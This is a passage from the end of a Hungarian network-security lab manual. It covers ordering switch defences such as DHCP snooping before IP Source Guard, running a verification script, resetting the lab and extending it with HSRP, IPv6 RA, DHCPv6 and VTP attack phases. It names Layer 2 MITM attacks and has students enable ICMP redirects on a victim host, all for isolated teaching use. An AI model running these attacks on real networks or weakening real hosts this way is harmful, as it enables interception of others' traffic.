## 23\. Kritikus sorrend és fázisközi figyelmeztetések

Ezeket a `mitigations.yml` fejléce is említi („lásd a 23. fejezet") — ezek a leggyakoribb elakadások forrásai:

1. **IP Source Guard csak DHCP Snooping UTÁN.** A 10. fázis `ip-source-guard` szekciója a snooping binding-táblájából dolgozik. Ha előbb töltöd fel, mint a `dhcp-snooping`-ot (3. fázis), **minden** user-forgalom elesik. (Ezt érdemes szándékosan is megmutatni hibakeresési gyakorlatként.)

2. **Double-tagging újrafuttatása.** A `native-vlan-hardening` (9v) feltöltése után **futtasd újra** a 9. fázis támadását, hogy lásd a védelem hatását.

3. **12. fázis: `accept_redirects=1` a PC-V-n.** A redirect-demóhoz a PC-V-n engedélyezni kell a redirectek elfogadását (lásd 12. fázis). A lecke épp az, hogy éles rendszeren ez miért van tiltva.

4. **err-disabled portok helyreállítása.** A 2. fázis (`violation shutdown`) és a 6. fázis (BPDU Guard) után a Fa0/3 **err-disabled** állapotba kerülhet. A **következő támadás futtatása ELŐTT** állítsd helyre a portot az eszköz konzolján/SSH-n:

  ```
  configure terminal
  interface fa0/3
  shutdown
  no shutdown
  end
  ```

  Alternatíva: `errdisable recovery cause psecure-violation` (automatikus visszaállás).

---

# V. RÉSZ — Lezárás

## 24\. A beállítások ellenőrzése (`verify.py`)

A 12 védelem feltöltése után futtasd az ellenőrzőt a PC-A-n (aktív venv):

```bash
python3 verify.py inventory.yml
```

További kapcsolók:

```bash
python3 verify.py inventory.yml --verbose             # a nyers show-kimenetekkel (hibakereséshez)
python3 verify.py inventory.yml --json eredmeny.json  # gépi kiértékeléshez (JSON export)
python3 verify.py inventory.yml --only S1             # csak egy eszköz ellenőrzése
```

**Mit csinál:** **27 ellenőrzést** futtat. Minden ellenőrzés pozitív (KELL szerepelnie) és/vagy negatív (NEM SZABAD szerepelnie) regex-mintákkal nézi meg az eszköz `show`-kimenetét. A szkript **nem ad jegyet és nem pontoz** — minden sornál kiírja, hogy **Pipa** (a védelem a helyén van) vagy **Hiba** (hiányzik/rossz a beállítás), a végén pedig összesíti: `Átment ellenőrzések: X / 27`, és felsorolja a hibás sorokat.

A szkript **kilépési kódja 0, ha minden (elérhető eszközön futtatott) ellenőrzés átment**, és 1, ha legalább egy megbukott (CI-barát). Az eredményt (`Átment ellenőrzések: ___/27`) írd be a `hallgatoi-feladatlap.md` megfelelő mezőjébe.

## 25\. Reflexió (adatvédelmi lap)

A 12. fázis után töltsd ki a `docs/reflexios-lap.md`-et. Ez a MITM-támadások **adatvédelmi** vonatkozásait dolgozza fel:

* mit lát a támadó HTTP vs. HTTPS esetén (és mit árul el a TLS SNI),

* DNS vs. DoH vs. DNSSEC különbségei,

* a Layer 2-védelmek párosítása GDPR-elvekkel,

* dilemmakérdések.

**A nagy tanulság:** a titkosítás (HTTPS, DoH, DNSSEC) sem véd, ha a Layer 2-alap nincs megerősítve — a támadó a switch szintjén közéékelődhet. Az oktatói megoldókulcs a `docs/index-es-deploy-checklist.md`-ben van.

## 26\. Visszaállítás a következő csoportnak

A labor végén állítsd vissza a védtelen kiinduló állapotot:

```bash
python3 push_config.py inventory.yml configs/baseline.yml
```

Majd takarítsd a maradékokat az eszközökön (konzol/SSH):

* **sticky MAC-ek** és **DHCP snooping binding-ek**: a megfelelő `clear` parancsokkal,

* **err-disabled portok**: `shutdown` / `no shutdown`, vagy `errdisable recovery cause …`.

A 12. fázis miatt a PC-V-n érdemes a redirect-elfogadást visszaállítani a biztonságos alapértelmezésre:

```bash
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
sudo sysctl -w net.ipv4.conf.eth0.accept_redirects=0
```

## 27\. Hibakeresési gyorslista

| Tünet | Valószínű ok / teendő |
| --- | --- |
| netmiko timeout / auth hiba | Rossz IP vagy jelszó az `inventory.yml`-ben; az eszköz nem elérhető a VLAN 99-en; az SSH nincs felhozva (`crypto key generate rsa`) |
| Push után „parancs nem ismert" | A YAML-blokkból hiányzik az explicit `exit` (a `push_config.py` nem szúr be automatikusat) |
| A támadás „nem csinál semmit" | Az ATTACKER nem root (hiányzik a `sudo`); rossz interfésznév (nem `eth0`); a virtuális switch portja nem promiscuous/trunk-áteresztő |
| Minden user-forgalom elesik a 10. fázisban | Az IPSG-t a DHCP snooping ELŐTT töltötted fel — előbb `dhcp-snooping`, utána `ip-source-guard` |
| A 8. fázisban nincs Telnet-próba | A baseline vty-blokkjából kimaradt a `transport input telnet ssh` |
| A 12. fázis nem működik | A PC-V-n nincs `accept_redirects=1`, vagy az `rp_filter` eldobja — ideiglenesen kapcsold ki |
| A `verify.py` egy védelemnél buktat, pedig beállítottad | Platform-/IOS-függő `show`-kimenet; nézd meg `--verbose`-zal, és igazítsd a YAML/regex párost a saját IOS-odhoz |
| `(.venv)` nem látszik a parancssor elején | Nincs aktiválva a venv — aktiváld újra (lásd 9. fejezet), különben rossz Python/csomagok futnak |

## 28\. Hogyan tovább — bővítés (13–16. fázis)

A labor ugyanezzel a ritmussal (támadás → védelem → verify) négy további fázissal bővíthető. A teljes értékelő táblázat és a scapy-vázak a `docs/AI-instrukcio.md` RÉSZ 0-ban vannak:

1. **13. HSRP/VRRP/GLBP eltérítés** — gateway-MITM FHRP-n át → védelem: `standby … authentication md5`

2. **14. IPv6 RA spoofing** (rogue Router Advertisement) → védelem: `ipv6 nd raguard`

3. **15. DHCPv6 starvation/spoofing** → védelem: `ipv6 dhcp guard` (a 14. UTÁN)

4. **16. VTP injection** (a VLAN-adatbázis felülírása) → védelem: `vtp mode transparent` / VTPv3

> **Biztonsági megkötés mindvégig:** a labor kizárólag izolált, oktatási szegmensen futtatható. A scapy-szkriptek valódi L2/L3 támadásokat hajtanak végre — éles vagy intézményi hálózaton futtatni őket tilos.

---

_A könyv vége. Ez a könyv a korábbi mester- és végigvezető dokumentáció összevont, lépésről lépésre követhető, önálló változata — minden szükséges tartalom benne van._